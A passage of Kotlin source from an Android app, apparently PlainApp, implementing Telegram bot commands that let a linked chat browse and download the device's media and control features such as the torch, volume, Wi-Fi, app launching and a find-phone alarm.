        if (e.author.isNotBlank()) sb.append("✍ ${htmlEsc(e.author)}\n")
        sb.append("🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
        if (e.url.isNotBlank()) sb.append("🔗 <a href=\"${htmlEsc(e.url)}\">Read original</a>\n")
        sb.append("\n")
        val body = e.content.ifBlank { e.description }.replace(Regex("<[^>]+>"), "").trim()
        sb.append(htmlEsc(body.take(3500)))
        if (body.length > 3500) sb.append("\n<i>… truncated</i>")
        val rows = listOf(listOf("⬅️ Back" to "fe_back:${e.feedId}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Music / Videos / Images library ----------------

    private suspend fun cmdMusic(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderMusicPage(q, 0, editMessageId = null)
    }

    private suspend fun renderMusicPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = AudioMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎵 No audio tracks found." else "🎵 No more tracks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎵 <b>Music</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a track to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val mins = a.duration / 60; val secs = a.duration % 60
                sb.append("${offset + i + 1}. 🎵 <b>${htmlEsc(a.title.take(60))}</b>\n")
                if (a.artist.isNotBlank()) sb.append("   👤 ${htmlEsc(a.artist.take(50))}\n")
                sb.append("   ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(a.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${a.title.take(28)}" to "mus_get:${pathToken(a.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "mus_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "mus_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read music: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaAudio(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Track gone: <code>${htmlEsc(path)}</code>"); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendAudio(token, chatId, f, "🎵 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdVideoLibrary(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderVideosPage(q, 0, editMessageId = null)
    }

    private suspend fun renderVideosPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = VideoMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎞 No videos found." else "🎞 No more videos."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎞 <b>Videos</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a video to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, v ->
                val mins = v.duration / 60; val secs = v.duration % 60
                sb.append("${offset + i + 1}. 🎬 <b>${htmlEsc(v.title.take(60))}</b>\n")
                sb.append("   📐 ${v.width}×${v.height}  ·  ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(v.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${v.title.take(28)}" to "vds_get:${pathToken(v.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "vds_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "vds_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read videos: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaVideo(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Video gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendVideo(token, chatId, f, "🎬 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdImages(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderImagesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderImagesPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = ImageMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🖼 No images found." else "🖼 No more images."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🖼 <b>Gallery</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap to send the photo here.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, img ->
                sb.append("${offset + i + 1}. 🖼 <b>${htmlEsc(img.title.take(60))}</b>\n")
                sb.append("   📐 ${img.width}×${img.height}  ·  📦 ${humanSize(img.size)}\n")
                sb.append("   🕐 ${fmtTime(img.createdAt.toEpochMilliseconds())}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${img.title.take(28)}" to "img_get:${pathToken(img.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "img_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "img_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read images: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaImage(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Image gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadPhoto()
        val ok = TelegramApiClient.sendPhoto(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
        if (!ok) {
            // Photo can fail for huge images; fall back to document.
            val ok2 = TelegramApiClient.sendDocument(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
            if (!ok2) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        }
    }

    // ---------------- Pomodoro ----------------

    private suspend fun cmdPomodoro(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        when (sub) {
            "start", "go" -> {
                val secs = try { PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60 } catch (_: Throwable) { 25 * 60 }
                sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                renderPomodoroStatus(editMessageId = null)
            }
            "pause" -> { sendEvent(HttpApiEvents.PomodoroPauseEvent()); renderPomodoroStatus(editMessageId = null) }
            "stop", "reset" -> { sendEvent(HttpApiEvents.PomodoroStopEvent()); renderPomodoroStatus(editMessageId = null) }
            else -> renderPomodoroStatus(editMessageId = null)
        }
    }

    private suspend fun renderPomodoroStatus(editMessageId: Long?) {
        try {
            val settings = PomodoroSettingsPreference.getValueAsync(MainApp.instance)
            val today = kotlinx.datetime.Clock.System.now()
                .toLocalDateTime(kotlinx.datetime.TimeZone.currentSystemDefault()).date.toString()
            val dao = com.ismartcoding.plain.db.AppDatabase.instance.pomodoroItemDao()
            val rec = try { dao.getByDate(today) } catch (_: Throwable) { null }
            val completed = rec?.completedCount ?: 0
            val sb = StringBuilder("🍅 <b>Pomodoro</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📅 Today: <b>$today</b>\n")
            sb.append("✅ Completed: <b>$completed</b> sessions\n")
            sb.append("⏱ Work: ${settings.workDuration} min  ·  Short break: ${settings.shortBreakDuration} min  ·  Long break: ${settings.longBreakDuration} min\n")
            sb.append("🔁 Long break every: ${settings.pomodorosBeforeLongBreak} sessions\n\n")
            sb.append("<i>Tap below to control the timer on the device.</i>")
            val rows = listOf(
                listOf("▶️ Start" to "pom_start", "⏸ Pause" to "pom_pause"),
                listOf("⏹ Stop" to "pom_stop", "🔄 Refresh" to "pom_refresh"),
            )
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Pomodoro error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Torch ----------------

    private suspend fun cmdTorch(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        try {
            when (sub) {
                "on", "1", "true" -> UtilitiesHelper.setTorch(true)
                "off", "0", "false" -> UtilitiesHelper.setTorch(false)
                "toggle" -> UtilitiesHelper.setTorch(!UtilitiesHelper.isTorchOn())
                null, "" -> { /* just show state */ }
                else -> { sendMessage("Usage: /torch [on|off|toggle]"); return }
            }
        } catch (e: Exception) {
            sendMessage("❌ Torch failed: ${htmlEsc(e.message ?: "")}")
            return
        }
        renderTorchState(editMessageId = null)
    }

    private suspend fun renderTorchState(editMessageId: Long?) {
        val on = try { UtilitiesHelper.isTorchOn() } catch (_: Throwable) { false }
        val sb = StringBuilder("🔦 <b>Flashlight</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (on) "🟢 ON" else "⚪ OFF"}</b>")
        val rows = listOf(listOf("🔦 ON" to "torch_on", "⚪ OFF" to "torch_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Speak / Vibrate / Show / Wake ----------------

    private suspend fun cmdSpeak(text: String) {
        val say = text.trim()
        if (say.isEmpty()) {
            pendingInput = "speak_text"
            sendMessage("🗣 <b>Text-to-speech</b>\n\nReply with the text to speak on the device.\nSend any /command to cancel.")
            return
        }
        UtilitiesHelper.speak(say)
        sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
    }

    private suspend fun cmdVibrate(args: List<String>) {
        val secs = args.firstOrNull()?.toIntOrNull() ?: 1
        val ms = (secs.coerceIn(1, 10)) * 1000L
        UtilitiesHelper.vibrate(ms)
        sendMessage("📳 Vibrating for ${ms / 1000}s")
    }

    private suspend fun cmdFindPhone(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "start" -> { LocateRingService.start(); renderFindPhoneState(editMessageId = null) }
            "off", "stop" -> { LocateRingService.stop(); renderFindPhoneState(editMessageId = null) }
            else -> renderFindPhoneState(editMessageId = null)
        }
    }

    private suspend fun renderFindPhoneState(editMessageId: Long?) {
        val running = LocateRingService.running
        val sb = StringBuilder("🚨 <b>Locate phone</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (running) "🚨 RINGING" else "🔕 OFF"}</b>\n\n")
        sb.append("<i>The device will play a loud alarm sound at full volume to help you find it.</i>")
        val rows = listOf(listOf("🚨 Start alarm" to "fp_on", "🔕 Stop" to "fp_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdShow(text: String) {
        val msg = text.trim()
        if (msg.isEmpty()) {
            pendingInput = "show_text"
            sendMessage("💡 <b>Show banner on device</b>\n\nReply with the message to show as a screen overlay.\nSend any /command to cancel.")
            return
        }
        if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
            sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
            return
        }
        MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
        sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
    }

    private suspend fun cmdWake(args: List<String>) {
        val secs = (args.firstOrNull()?.toIntOrNull() ?: 10).coerceIn(1, 120)
        UtilitiesHelper.wakeScreen(secs * 1000L)
        sendMessage("📺 Screen woken for ${secs}s.")
    }

    // ---------------- Brightness / Volume ----------------

    private suspend fun cmdBrightness(args: List<String>) {
        val pct = args.firstOrNull()?.toIntOrNull()
        if (pct == null) { renderBrightnessState(editMessageId = null); return }
        val ok = UtilitiesHelper.setBrightness(pct.coerceIn(0, 100))
        if (!ok) { sendMessage("⛔ WRITE_SETTINGS permission not granted. Enable it for PlainApp first."); return }
        renderBrightnessState(editMessageId = null)
    }

    private suspend fun renderBrightnessState(editMessageId: Long?) {
        val cur = try { UtilitiesHelper.getBrightness() } catch (_: Throwable) { 0 }
        val sb = StringBuilder("🔆 <b>Brightness</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: <b>${cur}%</b>\n\n<i>Tap a preset to change.</i>")
        val rows = listOf(
            listOf("0%" to "br_set:0", "25%" to "br_set:25", "50%" to "br_set:50"),
            listOf("75%" to "br_set:75", "100%" to "br_set:100"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdVolume(args: List<String>) {
        val a0 = args.getOrNull(0)?.lowercase()
        val a1 = args.getOrNull(1)?.toIntOrNull()
        if (a0 != null && a1 != null) {
            UtilitiesHelper.setVolume(a0, a1.coerceIn(0, 100))
        } else if (a0 != null && args.size == 1 && a0.toIntOrNull() != null) {
            UtilitiesHelper.setVolume("media", a0.toInt().coerceIn(0, 100))
        }
        renderVolumeState(editMessageId = null)
    }

    private suspend fun renderVolumeState(editMessageId: Long?) {
        val v = try { UtilitiesHelper.getVolumes() } catch (_: Throwable) { emptyMap() }
        val sb = StringBuilder("🔊 <b>Volume Levels</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        v.forEach { (k, p) -> sb.append("• <b>$k</b>: ${p}%\n") }
        sb.append("\n<i>Tap a preset to change media volume.</i>")
        val rows = listOf(
            listOf("🔇 0%" to "vol_set:media:0", "25%" to "vol_set:media:25", "50%" to "vol_set:media:50"),
            listOf("75%" to "vol_set:media:75", "🔊 100%" to "vol_set:media:100"),
            listOf("📞 Ring 50%" to "vol_set:ring:50", "🔔 Notif 50%" to "vol_set:notification:50"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Launch app ----------------

    private suspend fun cmdLaunch(args: List<String>) {
        if (args.isEmpty()) { renderLaunchAppsPage("", 0, editMessageId = null); return }
        val arg = args.joinToString(" ")
        // Direct launch if it looks like a package name
        if (arg.contains('.') && !arg.contains(' ')) {
            val ok = AppLauncherHelper.launch(arg)
            if (ok) { sendMessage("🚀 Launched <code>${htmlEsc(arg)}</code> on the device."); return }
        }
        renderLaunchAppsPage(arg.lowercase(), 0, editMessageId = null)
    }

    private suspend fun renderLaunchAppsPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val all = AppLauncherHelper.list(MainApp.instance, query).filter { it.launchable }
            val pageSize = 10
            val pageItems = all.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🚀 No launchable apps match <code>${htmlEsc(query)}</code>" else "🚀 No more apps."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🚀 <b>Launch app</b> · ${offset + 1}–${offset + pageItems.size} of ${all.size}\n<i>Tap an app to open it on the device.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                sb.append("${offset + i + 1}. 📱 <b>${htmlEsc(a.label)}</b>\n   <code>${htmlEsc(a.packageName)}</code>\n\n")
                rows.add(listOf("${offset + i + 1}. ${a.label.take(34)}" to "lrun:${pkgToken(a.packageName)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "lpg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < all.size) nav.add("Next ▶️" to "lpg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Wi-Fi ----------------

    private suspend fun cmdWifi(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true" -> WifiControlHelper.setWifiEnabled(true, MainApp.instance)
            "off", "0", "false" -> WifiControlHelper.setWifiEnabled(false, MainApp.instance)
            else -> { /* show state */ }
        }
        renderWifiState(editMessageId = null)
    }

    private suspend fun renderWifiState(editMessageId: Long?) {
        try {
            val s = WifiControlHelper.state(MainApp.instance)
            val sb = StringBuilder("📶 <b>Wi-Fi</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("State: <b>${if (s.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
            if (s.enabled) {
                if (s.connectedSsid.isNotBlank()) sb.append("Network: <b>${htmlEsc(s.connectedSsid)}</b>\n")
                if (s.ipv4.isNotBlank()) sb.append("IP: <code>${s.ipv4}</code>\n")
                if (s.linkSpeedMbps > 0) sb.append("Speed: ${s.linkSpeedMbps} Mbps\n")
                if (s.rssi > -127) sb.append("Signal: ${s.rssi} dBm\n")
                if (s.frequencyMhz > 0) sb.append("Freq: ${s.frequencyMhz} MHz\n")
            }
            sb.append("Hotspot: ${s.hotspotState}\n")
            val rows = listOf(listOf("🟢 Turn ON" to "wifi_on", "⚪ Turn OFF" to "wifi_off"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Wi-Fi error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Network usage ----------------

    private suspend fun cmdNetUsage(args: List<String>) {
        val days = (args.firstOrNull()?.toIntOrNull() ?: 7).coerceIn(1, 90)
        sendTyping()
        try {
            if (!NetworkUsageHelper.usageAccessGranted(MainApp.instance)) {
                sendMessage("⛔ Network usage requires the <b>Usage Access</b> permission.\nGrant it for PlainApp in Android Settings → Special Access → Usage Access.")
                return
            }
            val w = NetworkUsageHelper.query(days, MainApp.instance)
            val sb = StringBuilder("📊 <b>Network usage</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📥 Total RX: <b>${humanSize(w.totalRx)}</b>\n")
            sb.append("📤 Total TX: <b>${humanSize(w.totalTx)}</b>\n\n")
            sb.append("<b>Top apps:</b>\n")
            w.items.take(15).forEachIndexed { i, app ->
                sb.append("${i + 1}. <b>${htmlEsc(app.label.take(30))}</b>  ·  ${humanSize(app.rxBytes + app.txBytes)}\n")
                sb.append("   📶 Wi-Fi ${humanSize(app.rxBytesWifi + app.txBytesWifi)}  ·  📡 Mobile ${humanSize(app.rxBytesMobile + app.txBytesMobile)}\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Net usage error: ${htmlEsc(e.message ?: "")}")
        }
    }
}
